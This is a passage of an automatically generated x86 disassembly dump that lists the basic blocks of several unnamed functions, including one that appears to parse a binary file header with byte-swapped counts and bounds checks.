0xb0a7c7a:	mov	eax, dword ptr [esp + 0x2c]
0xb0a7c7e:	add	dword ptr [esi], eax
0xb0a7c80:	cmp	dword ptr gs:[0xc], 0
0xb0a7c88:	je	0xb0a7c8b
None
|
|
|
v
0xb0a7be6:	xor	eax, eax
0xb0a7be8:	mov	ecx, 1
0xb0a7bed:	cmp	dword ptr gs:[0xc], 0
0xb0a7bf5:	je	0xb0a7bf8
None
|
|
|
v
0xb0a7d73:	lea	ecx, dword ptr [ebx + 0x1ba0]
0xb0a7d79:	call	0xb0f9430
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0a7da0
TOTAL BLOCKS :9
0xb0a7dd4:	mov	dword ptr [ebx + 0x37ac], esi
0xb0a7dda:	lea	edx, dword ptr [eax + 1]
0xb0a7ddd:	cmp	edx, ecx
0xb0a7ddf:	jb	0xb0a7db8
None
|
|
|
v
0xb0a7de1:	pop	ebx
0xb0a7de2:	pop	esi
0xb0a7de3:	ret	
None
|
|
|
v
0xb0a7db8:	cmp	byte ptr [edx], 0
0xb0a7dbb:	mov	eax, edx
0xb0a7dbd:	je	0xb0a7dda
None
|
|
|
v
0xb0a7dc8:	mov	esi, eax
0xb0a7dca:	sub	esi, edx
0xb0a7dcc:	cmp	dword ptr [ebx + 0x37ac], esi
0xb0a7dd2:	jae	0xb0a7dda
None
|
|
|
v
0xb0a7da7:	add	ebx, 0x103259
0xb0a7dad:	mov	edx, dword ptr [ebx + 0x1bbc]
0xb0a7db3:	lea	ecx, dword ptr [edx + eax]
0xb0a7db6:	nop	
0xb0a7db8:	cmp	byte ptr [edx], 0
0xb0a7dbb:	mov	eax, edx
0xb0a7dbd:	je	0xb0a7dda
None
|
|
|
v
0xb0a7da0:	push	esi
0xb0a7da1:	push	ebx
0xb0a7da2:	call	0xb1267db
None
|
|
|
v
0xb0a7dda:	lea	edx, dword ptr [eax + 1]
0xb0a7ddd:	cmp	edx, ecx
0xb0a7ddf:	jb	0xb0a7db8
None
|
|
|
v
0xb0a7dc0:	add	eax, 1
0xb0a7dc3:	cmp	byte ptr [eax], 0
0xb0a7dc6:	jne	0xb0a7dc0
None
|
|
|
v
0xb0a7dbf:	nop	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b0a7df0
TOTAL BLOCKS :191
0xb0a8968:	mov	edi, dword ptr [ebx + 0x1bc4]
0xb0a896e:	test	edi, edi
0xb0a8970:	jne	0xb0a8208
None
|
|
|
v
0xb0a8a1f:	nop	
0xb0a8a20:	jmp	0xb0a887e
None
|
|
|
v
0xb0a897b:	mov	dword ptr [esp], esi
0xb0a897e:	mov	dword ptr [ebp - 0xe0], edx
0xb0a8984:	call	0xb070a80
None
|
|
|
v
0xb0a7efc:	lea	eax, dword ptr [ebp - 0x78]
0xb0a7eff:	mov	dword ptr [esp + 8], eax
0xb0a7f03:	mov	dword ptr [esp + 4], esi
0xb0a7f07:	mov	dword ptr [esp], 3
0xb0a7f0e:	call	0xb0da2a0
None
|
|
|
v
0xb0a8671:	mov	eax, dword ptr [ebp - 0xc8]
0xb0a8677:	call	0xb0a7da0
None
|
|
|
v
0xb0a88cf:	mov	dword ptr [ebx + 0x1ba8], eax
0xb0a88d5:	jmp	0xb0a8591
None
|
|
|
v
0xb0a83f8:	mov	ecx, dword ptr [ebx + 0x1bb0]
0xb0a83fe:	test	ecx, ecx
0xb0a8400:	je	0xb0a84c5
None
|
|
|
v
0xb0a8567:	cmp	eax, edi
0xb0a8569:	mov	edx, dword ptr [ebx + 0x1bc0]
0xb0a856f:	jbe	0xb0a8584
None
|
|
|
v
0xb0a844d:	mov	edi, dword ptr [ebp - 0xbc]
0xb0a8453:	mov	ecx, dword ptr [ebp - 0xac]
0xb0a8459:	mov	eax, edi
0xb0a845b:	shl	eax, 3
0xb0a845e:	bswap	ecx
0xb0a8460:	mov	dword ptr [ebp - 0xc0], eax
0xb0a8466:	mov	eax, dword ptr [ebx + 0x1bac]
0xb0a846c:	mov	dword ptr [eax + edi*8], ecx
0xb0a846f:	mov	edi, dword ptr [ebp - 0xc4]
0xb0a8475:	mov	eax, dword ptr [esi + 4]
0xb0a8478:	cmp	eax, dword ptr [esi + 8]
0xb0a847b:	jae	0xb0a897b
None
|
|
|
v
0xb0a8a5d:	mov	edx, dword ptr [ebp - 0xbc]
0xb0a8a63:	cmp	eax, 0xff
0xb0a8a66:	je	0xb0a7f73
None
|
|
|
v
0xb0a843a:	lea	ecx, dword ptr [eax + 1]
0xb0a843d:	mov	dword ptr [esi + 4], ecx
0xb0a8440:	movzx	eax, byte ptr [eax]
0xb0a8443:	add	edi, 1
0xb0a8446:	cmp	edi, edx
0xb0a8448:	mov	byte ptr [edi - 1], al
0xb0a844b:	jne	0xb0a842e
None
|
|
|
v
0xb0a7f88:	mov	eax, dword ptr [ebx + 0xed4]
0xb0a7f8e:	mov	dword ptr [esp], eax
0xb0a7f91:	call	0xb017470
None
|
|
|
v
0xb0a7f31:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb0a8666:	mov	eax, dword ptr [edi + 4]
0xb0a8669:	test	eax, eax
0xb0a866b:	je	0xb0a893c
None
|
|
|
v
0xb0a89a0:	mov	dword ptr [esp], esi
0xb0a89a3:	mov	dword ptr [ebp - 0xc0], edx
0xb0a89a9:	call	0xb070a80
None
|
|
|
v
0xb0a869a:	mov	edx, dword ptr [ebx - 0xb0]
0xb0a86a0:	neg	eax
0xb0a86a2:	mov	ecx, dword ptr [ebp - 0xcc]
0xb0a86a8:	mov	dword ptr [edx], ecx
0xb0a86aa:	mov	edx, dword ptr [ebx - 0xe8]
0xb0a86b0:	mov	dword ptr [edx], eax
0xb0a86b2:	jmp	0xb0a8329
None
|
|
|
v
0xb0a89ce:	nop	
0xb0a89d0:	jmp	0xb0a884c
None
|
|
|
v
0xb0a8a71:	xor	ecx, ecx
0xb0a8a73:	cmp	eax, dword ptr [ebp - 0xc4]
0xb0a8a79:	setne	cl
0xb0a8a7c:	mov	dword ptr [ebp - 0xcc], ecx
0xb0a8a82:	jmp	0xb0a869a
None
|
|
|
v
0xb0a818f:	cmp	eax, dword ptr [ebx + 0x1bcc]
0xb0a8195:	mov	dword ptr [ebp - 0xbc], eax
0xb0a819b:	jne	0xb0a7f73
None
|
|
|
v
0xb0a80cb:	add	eax, dword ptr [ebp - 0xc8]
0xb0a80d1:	cmp	eax, 0xfc
0xb0a80d4:	ja	0xb0a7f73
None
|
|
|
v
0xb0a8494:	mov	eax, dword ptr [ebx + 0x1bac]
0xb0a849a:	mov	ecx, dword ptr [ebp - 0xac]
0xb0a84a0:	mov	edi, dword ptr [ebp - 0xc0]
0xb0a84a6:	add	dword ptr [ebp - 0xbc], 1
0xb0a84ad:	bswap	ecx
0xb0a84af:	mov	dword ptr [eax + edi + 4], ecx
0xb0a84b3:	mov	eax, dword ptr [ebp - 0xbc]
0xb0a84b9:	cmp	dword ptr [ebx + 0x1bb0], eax
0xb0a84bf:	ja	0xb0a8428
None
|
|
|
v
0xb0a8359:	cmp	eax, 1
0xb0a835c:	ja	0xb0a7f73
None
|
|
|
v
0xb0a88bc:	mov	eax, dword ptr [ebp - 0xbc]
0xb0a88c2:	mov	byte ptr [eax + edi - 2], 0
0xb0a88c7:	mov	dword ptr [esp], eax
0xb0a88ca:	call	0xb0a70d0
None
|
|
|
v
0xb0a84e4:	lea	ecx, dword ptr [eax + 1]
0xb0a84e7:	mov	dword ptr [esi + 4], ecx
0xb0a84ea:	movzx	eax, byte ptr [eax]
0xb0a84ed:	test	eax, eax
0xb0a84ef:	mov	eax, dword ptr [ebx + 0x1bc0]
0xb0a84f5:	setne	byte ptr [eax + edi*8 + 6]
0xb0a84fa:	add	edi, 1
0xb0a84fd:	cmp	edi, edx
0xb0a84ff:	jne	0xb0a84d8
None
|
|
|
v
0xb0a8911:	mov	ecx, dword ptr [ebp - 0xc4]
0xb0a8917:	mov	eax, dword ptr [ebp - 0xc0]
0xb0a891d:	mov	dword ptr [ebx + 0x1bb4], ecx
0xb0a8923:	cmp	ecx, eax
0xb0a8925:	setne	cl
0xb0a8928:	movzx	ecx, cl
0xb0a892b:	mov	dword ptr [ebx + 0x1bb8], eax
0xb0a8931:	mov	dword ptr [ebp - 0xcc], ecx
0xb0a8937:	jmp	0xb0a869a
None
|
|
|
v
0xb0a8a17:	mov	dword ptr [esp], esi
0xb0a8a1a:	call	0xb070a80
None
|
|
|
v
0xb0a82ee:	nop	
0xb0a82f0:	jmp	0xb0a7f38
None
|
|
|
v
0xb0a8976:	jmp	0xb0a83c6
None
|
|
|
v
0xb0a83ea:	cmp	eax, edi
0xb0a83ec:	mov	dword ptr [ebp - 0xc8], eax
0xb0a83f2:	jne	0xb0a7f73
None
|
|
|
v
0xb0a8846:	jle	0xb0a89c2
None
|
|
|
v
0xb0a88ae:	mov	edx, dword ptr [ebp - 0xc0]
0xb0a88b4:	cmp	edx, eax
0xb0a88b6:	jne	0xb0a7f73
None
|
|
|
v
0xb0a8732:	mov	esi, dword ptr [ebp - 0xbc]
0xb0a8738:	movzx	esi, byte ptr [esi + eax - 1]
0xb0a873d:	lea	esi, dword ptr [edi + esi*8]
0xb0a8740:	cmp	byte ptr [esi + 4], 0
0xb0a8744:	je	0xb0a8721
None
|
|
|
v
0xb0a8887:	mov	eax, dword ptr [ebp - 0xbc]
0xb0a888d:	lea	edx, dword ptr [edi - 2]
0xb0a8890:	mov	dword ptr [esp + 8], edx
0xb0a8894:	mov	dword ptr [esp + 0xc], esi
0xb0a8898:	mov	dword ptr [esp + 4], 1
0xb0a88a0:	mov	dword ptr [esp], eax
0xb0a88a3:	mov	dword ptr [ebp - 0xc0], edx
0xb0a88a9:	call	0xb0696f0
None
|
|
|
v
0xb0a8787:	mov	eax, dword ptr [ebp - 0xd0]
0xb0a878d:	mov	dword ptr [esp + 8], 4
0xb0a8795:	mov	dword ptr [esp], edi
0xb0a8798:	mov	dword ptr [esp + 4], eax
0xb0a879c:	call	0xb07c620
None
|
|
|
v
0xb0a80ef:	shl	ecx, 3
0xb0a80f2:	mov	eax, ecx
0xb0a80f4:	mov	dword ptr [ebp - 0xe0], ecx
0xb0a80fa:	mov	ecx, edx
0xb0a80fc:	add	ecx, eax
0xb0a80fe:	mov	eax, ecx
0xb0a8100:	not	ecx
0xb0a8102:	cmp	ecx, dword ptr [ebp + 0xc]
0xb0a8105:	mov	dword ptr [ebp - 0xc4], edx
0xb0a810b:	jb	0xb0a7f73
None
|
|
|
v
0xb0a842e:	mov	eax, dword ptr [esi + 4]
0xb0a8431:	cmp	eax, dword ptr [esi + 8]
0xb0a8434:	jae	0xb0a89a0
None
|
|
|
v
0xb0a893c:	mov	eax, dword ptr [edi]
0xb0a893e:	mov	dword ptr [edi + 4], eax
0xb0a8941:	jmp	0xb0a8671
None
|
|
|
v
0xb0a8571:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb0a85b4:	mov	edi, dword ptr [ebx + 0x1bc4]
0xb0a85ba:	test	edi, edi
0xb0a85bc:	je	0xb0a85e4
None
|
|
|
v
0xb0a87a9:	mov	eax, dword ptr [ebp - 0x7c]
0xb0a87ac:	mov	ecx, dword ptr [ebp - 0x84]
0xb0a87b2:	mov	edi, dword ptr [ebp - 0x80]
0xb0a87b5:	mov	dword ptr [esp + 8], 1
0xb0a87bd:	bswap	eax
0xb0a87bf:	mov	dword ptr [ebp - 0xbc], eax
0xb0a87c5:	mov	eax, dword ptr [ebp - 0x88]
0xb0a87cb:	bswap	ecx
0xb0a87cd:	mov	dword ptr [esp], esi
0xb0a87d0:	bswap	edi
0xb0a87d2:	bswap	eax
0xb0a87d4:	mov	dword ptr [ebp - 0xc0], eax
0xb0a87da:	mov	eax, dword ptr [ebp - 0x8c]
0xb0a87e0:	mov	edx, eax
0xb0a87e2:	mov	eax, dword ptr [ebp - 0x90]
0xb0a87e8:	bswap	edx
0xb0a87ea:	add	edx, dword ptr [ebp - 0xbc]
0xb0a87f0:	bswap	eax
0xb0a87f2:	add	eax, edx
0xb0a87f4:	lea	edx, dword ptr [ecx + ecx*8]
0xb0a87f7:	mov	ecx, dword ptr [ebp - 0xc0]
0xb0a87fd:	add	eax, edx
0xb0a87ff:	lea	edx, dword ptr [edi + edi*2]
0xb0a8802:	lea	eax, dword ptr [eax + edx*2]
0xb0a8805:	lea	edx, dword ptr [ecx + ecx*2]
0xb0a8808:	lea	eax, dword ptr [eax + edx*4]
0xb0a880b:	mov	dword ptr [esp + 4], eax
0xb0a880f:	call	0xb067420
None
|
|
|
v
0xb0a7ffd:	cmp	eax, 1
0xb0a8000:	jne	0xb0a7f73
None
|
|
|
v
0xb0a7e6c:	cmp	dl, 0x2f
0xb0a7e6f:	je	0xb0a8280
None
|
|
|
v
0xb0a8443:	add	edi, 1
0xb0a8446:	cmp	edi, edx
0xb0a8448:	mov	byte ptr [edi - 1], al
0xb0a844b:	jne	0xb0a842e
None
|
|
|
v
0xb0a8034:	mov	edx, dword ptr [ebp - 0x7c]
0xb0a8037:	mov	edi, dword ptr [ebp - 0x84]
0xb0a803d:	mov	eax, dword ptr [ebp - 0x80]
0xb0a8040:	mov	ecx, dword ptr [ebp - 0x88]
0xb0a8046:	bswap	edx
0xb0a8048:	mov	dword ptr [ebp - 0xc8], edx
0xb0a804e:	mov	edx, dword ptr [ebp - 0x8c]
0xb0a8054:	bswap	edi
0xb0a8056:	cmp	edi, 0x33333332
0xb0a805c:	bswap	eax
0xb0a805e:	mov	dword ptr [ebx + 0x1bcc], edi
0xb0a8064:	bswap	ecx
0xb0a8066:	mov	dword ptr [ebx + 0x1bc4], eax
0xb0a806c:	bswap	edx
0xb0a806e:	mov	dword ptr [ebp - 0xdc], edx
0xb0a8074:	mov	edx, dword ptr [ebp - 0x90]
0xb0a807a:	mov	dword ptr [ebx + 0x1bb0], ecx
0xb0a8080:	bswap	edx
0xb0a8082:	mov	dword ptr [ebp - 0xd8], edx
0xb0a8088:	ja	0xb0a7f73
None
|
|
|
v
0xb0a85aa:	mov	dword ptr [esp], esi
0xb0a85ad:	xor	esi, esi
0xb0a85af:	call	0xb0634f0
None
|
|
|
v
0xb0a865c:	mov	eax, dword ptr [edi]
0xb0a865e:	test	eax, eax
0xb0a8660:	je	0xb0a8946
None
|
|
|
v
0xb0a8538:	mov	eax, dword ptr [esi + 4]
0xb0a853b:	cmp	eax, dword ptr [esi + 8]
0xb0a853e:	jae	0xb0a8a4f
None
|
|
|
v
0xb0a81a9:	mov	ecx, dword ptr [ebx + 0x1bc8]
0xb0a81af:	mov	edi, dword ptr [ebx + 0x1bc4]
0xb0a81b5:	movzx	eax, byte ptr [ecx]
0xb0a81b8:	cmp	edi, eax
0xb0a81ba:	jbe	0xb0a7f73
None
|
|
|
v
0xb0a8208:	lea	eax, dword ptr [ebp - 0xac]
0xb0a820e:	mov	dword ptr [ebp - 0xc4], eax
0xb0a8214:	lea	eax, dword ptr [ebp - 0xa8]
0xb0a821a:	mov	dword ptr [ebp - 0xc0], 0
0xb0a8224:	mov	dword ptr [ebp - 0xbc], eax
0xb0a822a:	lea	esi, dword ptr [esi]
0xb0a8230:	mov	eax, dword ptr [esi + 4]
0xb0a8233:	mov	ecx, dword ptr [esi + 8]
0xb0a8236:	mov	edi, dword ptr [ebp - 0xc4]
0xb0a823c:	cmp	eax, ecx
0xb0a823e:	jae	0xb0a8261
None
|
|
|
v
0xb0a8953:	mov	eax, dword ptr [ebx + 0x1bbc]
0xb0a8959:	mov	dword ptr [esp], eax
0xb0a895c:	call	0xb0a70d0
None
|
|
|
v
0xb0a7f6f:	test	eax, eax
0xb0a7f71:	je	0xb0a7f88
None
|
|
|
v
0xb0a8824:	test	eax, eax
0xb0a8826:	js	0xb0a7f73
None
|
|
|
v
0xb0a8a4f:	mov	dword ptr [esp], esi
0xb0a8a52:	mov	dword ptr [ebp - 0xbc], edx
0xb0a8a58:	call	0xb070a80
None
|
|
|
v
0xb0a831a:	mov	eax, dword ptr [ebx + 0x1bd0]
0xb0a8320:	cmp	dword ptr [ebp - 0x30], eax
0xb0a8323:	jne	0xb0a7f38
None
|
|
|
v
0xb0a7e8d:	xor	ecx, ecx
0xb0a7e8f:	mov	edx, dword ptr [ebp - 0xbc]
0xb0a7e95:	test	eax, eax
0xb0a7e97:	jne	0xb0a7e35
None
|
|
|
v
0xb0a8a12:	jmp	0xb0a7f73
None
|
|
|
v
0xb0a7f50:	mov	dword ptr [esp], eax
0xb0a7f53:	call	0xb066f40
None
|
|
|
v
0xb0a7ebb:	cmp	byte ptr [eax], 0
0xb0a7ebe:	lea	edx, dword ptr [ebx - 0x4910c]
0xb0a7ec4:	cmove	eax, edx
0xb0a7ec7:	mov	dword ptr [esp + 8], eax
0xb0a7ecb:	lea	eax, dword ptr [ebx - 0x49168]
0xb0a7ed1:	mov	dword ptr [esp + 4], eax
0xb0a7ed5:	lea	eax, dword ptr [ebp - 0xb0]
0xb0a7edb:	mov	dword ptr [esp + 0xc], esi
0xb0a7edf:	mov	dword ptr [esp], eax
0xb0a7ee2:	call	0xb04d4c0
None
|
|
|
v
0xb0a8006:	lea	eax, dword ptr [ebx - 0x49162]
0xb0a800c:	mov	dword ptr [esp + 8], 4
0xb0a8014:	mov	dword ptr [esp + 4], eax
0xb0a8018:	mov	dword ptr [esp], edi
0xb0a801b:	mov	dword ptr [ebp - 0xd0], eax
0xb0a8021:	call	0xb07c620
None
|
|
|
v
0xb0a7e60:	mov	eax, dword ptr [ebx - 0x100]
0xb0a7e66:	mov	ecx, dword ptr [eax]
0xb0a7e68:	test	ecx, ecx
0xb0a7e6a:	je	0xb0a7ea0
None
|
|
|
v
0xb0a877e:	cmp	eax, 1
0xb0a8781:	jne	0xb0a7f73
None
|
|
|
v
0xb0a8601:	jmp	0xb0a8946
None
|
|
|
v
0xb0a8524:	mov	edx, dword ptr [ebp - 0xd8]
0xb0a852a:	xor	edi, edi
0xb0a852c:	test	edx, edx
0xb0a852e:	je	0xb0a8567
None
|
|
|
v
0xb0a84d8:	mov	eax, dword ptr [esi + 4]
0xb0a84db:	cmp	eax, dword ptr [esi + 8]
0xb0a84de:	jae	0xb0a89f5
None
|
|
|
v
0xb0a8755:	mov	edx, 1
0xb0a875a:	jmp	0xb0a8719
None
|
|
|
v
0xb0a86f8:	mov	esi, dword ptr [ebp - 0xbc]
0xb0a86fe:	movzx	esi, byte ptr [esi + eax - 1]
0xb0a8703:	lea	esi, dword ptr [edi + esi*8]
0xb0a8706:	cmp	byte ptr [esi + 4], 0
0xb0a870a:	jne	0xb0a872e
None
|
|
|
v
0xb0a870c:	mov	ecx, dword ptr [esi]
0xb0a870e:	mov	dword ptr [ebp - 0xc0], ecx
0xb0a8714:	mov	ecx, 1
0xb0a8719:	test	cl, dl
0xb0a871b:	jne	0xb0a8911
None
|
|
|
v
0xb0a8240:	lea	edx, dword ptr [eax + 1]
0xb0a8243:	mov	dword ptr [esi + 4], edx
0xb0a8246:	movzx	eax, byte ptr [eax]
0xb0a8249:	add	edi, 1
0xb0a824c:	cmp	edi, dword ptr [ebp - 0xbc]
0xb0a8252:	mov	byte ptr [edi - 1], al
0xb0a8255:	je	0xb0a8348
None
|
|
|
v
0xb0a7f38:	lea	eax, dword ptr [ebx - 0x4b01c]
0xb0a7f3e:	mov	dword ptr [esp], esi
0xb0a7f41:	mov	dword ptr [esp + 4], eax
0xb0a7f45:	call	0xb063f60
None
|
|
|
v
0xb0a887e:	cmp	eax, 0xa
0xb0a8881:	jne	0xb0a7f73
None
|
|
|
v
0xb0a7f4a:	test	eax, eax
0xb0a7f4c:	mov	esi, eax
0xb0a7f4e:	je	0xb0a7f7b
None
|
|
|
v
0xb0a825b:	mov	eax, edx
0xb0a825d:	cmp	eax, ecx
0xb0a825f:	jb	0xb0a8240
None
|
|
|
v
0xb0a7e99:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb0a875c:	mov	edi, dword ptr [ebp - 0xd4]
0xb0a8762:	mov	dword ptr [esp + 0xc], esi
0xb0a8766:	mov	dword ptr [esp + 8], 1
0xb0a876e:	mov	dword ptr [esp + 4], 0x2c
0xb0a8776:	mov	dword ptr [esp], edi
0xb0a8779:	call	0xb0696f0
None
|
|
|
v
0xb0a811c:	test	eax, eax
0xb0a811e:	mov	dword ptr [ebx + 0xed4], eax
0xb0a8124:	je	0xb0a7f73
None
|
|
|
v
0xb0a7e33:	xor	ecx, ecx
0xb0a7e35:	mov	dword ptr [esp], ecx
0xb0a7e38:	call	0xb017470
None
|
|
|
v
0xb0a8719:	test	cl, dl
0xb0a871b:	jne	0xb0a8911
None
|
|
|
v
0xb0a812a:	lea	edx, dword ptr [eax + edi*4]
0xb0a812d:	mov	ecx, dword ptr [ebp - 0xc4]
0xb0a8133:	mov	dword ptr [ebx + 0x1bc8], edx
0xb0a8139:	mov	edx, dword ptr [ebp - 0xbc]
0xb0a813f:	mov	dword ptr [ebx + 0x1ba8], 0
0xb0a8149:	add	ecx, eax
0xb0a814b:	add	edx, eax
0xb0a814d:	mov	dword ptr [ebx + 0x1bc0], edx
0xb0a8153:	add	edx, dword ptr [ebp - 0xc0]
0xb0a8159:	mov	dword ptr [ebx + 0x1bac], ecx
0xb0a815f:	mov	dword ptr [ebx + 0x1bbc], edx
0xb0a8165:	mov	edx, dword ptr [ebp + 0xc]
0xb0a8168:	test	edx, edx
0xb0a816a:	je	0xb0a8177
None
|
|
|
v
0xb0a7f73:	mov	dword ptr [esp], esi
0xb0a7f76:	call	0xb0634f0
None
|
|
|
v
0xb0a88e0:	mov	eax, dword ptr [ebp - 0xc0]
0xb0a88e6:	test	edx, edx
0xb0a88e8:	mov	dword ptr [ebx + 0x1bb8], eax
0xb0a88ee:	mov	eax, dword ptr [ebp - 0xc4]
0xb0a88f4:	mov	dword ptr [ebx + 0x1bb4], eax
0xb0a88fa:	mov	eax, dword ptr [ebp - 0xc0]
0xb0a8900:	jne	0xb0a8a71
None
|
|
|
v
0xb0a8300:	mov	edx, dword ptr [ebp - 0x74]
0xb0a8303:	mov	eax, dword ptr [ebp - 0x78]
0xb0a8306:	xor	edx, dword ptr [ebx + 0x1be4]
0xb0a830c:	xor	eax, dword ptr [ebx + 0x1be0]
0xb0a8312:	or	edx, eax
0xb0a8314:	jne	0xb0a7f38
None
|
|
|
v
0xb0a89dd:	lea	esi, dword ptr [esi]
0xb0a89e0:	jmp	0xb0a8359
None
|
|
|
v
0xb0a8746:	mov	edx, dword ptr [esi]
0xb0a8748:	mov	dword ptr [ebp - 0xc4], edx
0xb0a874e:	mov	edx, 1
0xb0a8753:	jmp	0xb0a8719
None
|
|
|
v
0xb0a8989:	mov	edx, dword ptr [ebp - 0xe0]
0xb0a898f:	cmp	eax, 0xff
0xb0a8992:	je	0xb0a7f73
None
|
|
|
v
0xb0a7e55:	lea	esp, dword ptr [ebp - 0xc]
0xb0a7e58:	pop	ebx
0xb0a7e59:	pop	esi
0xb0a7e5a:	pop	edi
0xb0a7e5b:	pop	ebp
0xb0a7e5c:	ret	
None
|
|
|
v
0xb0a7ef8:	test	edi, edi
0xb0a7efa:	je	0xb0a7f38
None
|
|
|
v
0xb0a8a6c:	jmp	0xb0a854d
None
|
|
|
v
0xb0a7f7b:	mov	ecx, dword ptr [ebp - 0xb0]
0xb0a7f81:	jmp	0xb0a7e35
None
|
|
|
v
0xb0a7f58:	lea	edx, dword ptr [ebp - 0x78]
0xb0a7f5b:	mov	dword ptr [esp + 8], edx
0xb0a7f5f:	mov	dword ptr [esp], 3
0xb0a7f66:	mov	dword ptr [esp + 4], eax
0xb0a7f6a:	call	0xb0da2f0
None
|
|
|
v
0xb0a872e:	test	edx, edx
0xb0a8730:	jne	0xb0a8755
None
|
|
|
v
0xb0a8272:	mov	edx, dword ptr [esi + 4]
0xb0a8275:	mov	ecx, dword ptr [esi + 8]
0xb0a8278:	jmp	0xb0a8249
None
|
|
|
v
0xb0a8686:	mov	eax, dword ptr [ebx + 0x1bc0]
0xb0a868c:	mov	eax, dword ptr [eax]
0xb0a868e:	mov	dword ptr [ebx + 0x1bb4], eax
0xb0a8694:	mov	dword ptr [ebx + 0x1bb8], eax
0xb0a869a:	mov	edx, dword ptr [ebx - 0xb0]
0xb0a86a0:	neg	eax
0xb0a86a2:	mov	ecx, dword ptr [ebp - 0xcc]
0xb0a86a8:	mov	dword ptr [edx], ecx
0xb0a86aa:	mov	edx, dword ptr [ebx - 0xe8]
0xb0a86b0:	mov	dword ptr [edx], eax
0xb0a86b2:	jmp	0xb0a8329
None
|
|
|
v
0xb0a884c:	mov	edi, dword ptr [ebp - 0xbc]
0xb0a8852:	sub	edi, eax
0xb0a8854:	lea	eax, dword ptr [edi + 0x1d]
0xb0a8857:	and	eax, 0xfffffff0
0xb0a885a:	sub	esp, eax
0xb0a885c:	lea	eax, dword ptr [esp + 0x1f]
0xb0a8860:	and	eax, 0xfffffff0
0xb0a8863:	mov	dword ptr [ebp - 0xbc], eax
0xb0a8869:	mov	eax, dword ptr [esi + 4]
0xb0a886c:	cmp	eax, dword ptr [esi + 8]
0xb0a886f:	jae	0xb0a8a17
None
|
|
|
v
0xb0a8350:	lea	eax, dword ptr [edx + 1]
0xb0a8353:	mov	dword ptr [esi + 4], eax
0xb0a8356:	movzx	eax, byte ptr [edx]
0xb0a8359:	cmp	eax, 1
0xb0a835c:	ja	0xb0a7f73
None
|
|
|
v
0xb0a8385:	lea	edx, dword ptr [eax + 1]
0xb0a8388:	mov	dword ptr [esi + 4], edx
0xb0a838b:	movzx	eax, byte ptr [eax]
0xb0a838e:	cmp	eax, dword ptr [ebp - 0xc8]
0xb0a8394:	ja	0xb0a7f73
None
|
|
|
v
0xb0a8a03:	mov	edx, dword ptr [ebp - 0xbc]
0xb0a8a09:	cmp	eax, 0xff
0xb0a8a0c:	jne	0xb0a84ed
None
|
|
|
v
0xb0a8511:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb0a882c:	mov	ecx, dword ptr [ebp - 0x4c]
0xb0a882f:	lea	edi, dword ptr [eax + 2]
0xb0a8832:	mov	dword ptr [ebp - 0xbc], ecx
0xb0a8838:	mov	ecx, edi
0xb0a883a:	sar	ecx, 0x1f
0xb0a883d:	cmp	dword ptr [ebp - 0x48], ecx
0xb0a8840:	jl	0xb0a7f73
None
|
|
|
v
0xb0a8561:	mov	eax, dword ptr [ebx + 0x1bc4]
0xb0a8567:	cmp	eax, edi
0xb0a8569:	mov	edx, dword ptr [ebx + 0x1bc0]
0xb0a856f:	jbe	0xb0a8584
None
|
|
|
v
0xb0a8961:	mov	dword ptr [edi], eax
0xb0a8963:	jmp	0xb0a8666
None
|
|
|
v
0xb0a7f13:	test	eax, eax
0xb0a7f15:	jne	0xb0a7f38
None
|
|
|
v
0xb0a881c:	mov	dword ptr [esp], esi
0xb0a881f:	call	0xb068460
None
|
|
|
v
0xb0a7ea5:	lea	eax, dword ptr [ebx - 0x4916e]
0xb0a7eab:	mov	dword ptr [esp], eax
0xb0a7eae:	call	0xb032860
None
|
|
|
v
0xb0a7f17:	mov	edx, dword ptr [ebp - 0x1c]
0xb0a7f1a:	mov	eax, dword ptr [ebp - 0x20]
0xb0a7f1d:	xor	edx, dword ptr [ebx + 0x1bdc]
0xb0a7f23:	xor	eax, dword ptr [ebx + 0x1bd8]
0xb0a7f29:	or	edx, eax
0xb0a7f2b:	je	0xb0a8300
None
|
|
|
v
0xb0a8530:	mov	edx, dword ptr [ebp - 0xd8]
0xb0a8536:	nop	
0xb0a8538:	mov	eax, dword ptr [esi + 4]
0xb0a853b:	cmp	eax, dword ptr [esi + 8]
0xb0a853e:	jae	0xb0a8a4f
None
|
|
|
v
0xb0a84ed:	test	eax, eax
0xb0a84ef:	mov	eax, dword ptr [ebx + 0x1bc0]
0xb0a84f5:	setne	byte ptr [eax + edi*8 + 6]
0xb0a84fa:	add	edi, 1
0xb0a84fd:	cmp	edi, edx
0xb0a84ff:	jne	0xb0a84d8
None
|
|
|
v
0xb0a839a:	add	edi, dword ptr [ebx + 0x1bc0]
0xb0a83a0:	add	dword ptr [ebp - 0xc0], 1
0xb0a83a7:	mov	byte ptr [edi + 5], al
0xb0a83aa:	mov	eax, dword ptr [ebp - 0xac]
0xb0a83b0:	bswap	eax
0xb0a83b2:	mov	dword ptr [edi], eax
0xb0a83b4:	mov	eax, dword ptr [ebp - 0xc0]
0xb0a83ba:	cmp	dword ptr [ebx + 0x1bc4], eax
0xb0a83c0:	ja	0xb0a8230
None
|
|
|
v
0xb0a7eb3:	test	eax, eax
0xb0a7eb5:	je	0xb0a82f5
None
|
|
|
v
0xb0a7df0:	push	ebp
0xb0a7df1:	mov	ebp, esp
0xb0a7df3:	push	edi
0xb0a7df4:	push	esi
0xb0a7df5:	push	ebx
0xb0a7df6:	call	0xb1267db
None
|
|
|
v
0xb0a82a0:	mov	edx, dword ptr [ebp - 0xbc]
0xb0a82a6:	test	eax, eax
0xb0a82a8:	je	0xb0a7e75
None
|
|
|
v
0xb0a8998:	jmp	0xb0a848a
None
|
|
|
v
0xb0a8348:	cmp	edx, ecx
0xb0a834a:	jae	0xb0a89d5
None
|
|
|
v
0xb0a859b:	cmp	byte ptr [eax], 0
0xb0a859e:	jne	0xb0a85aa
None
|
|
|
v
0xb0a8177:	mov	dword ptr [esp + 0xc], esi
0xb0a817b:	mov	dword ptr [esp + 8], edi
0xb0a817f:	mov	dword ptr [esp + 4], 5
0xb0a8187:	mov	dword ptr [esp], eax
0xb0a818a:	call	0xb0696f0
None
|
|
|
v
0xb0a85e4:	mov	esi, dword ptr [ebx + 0x1bcc]
0xb0a85ea:	mov	edi, dword ptr [ebx - 0xec]
0xb0a85f0:	test	esi, esi
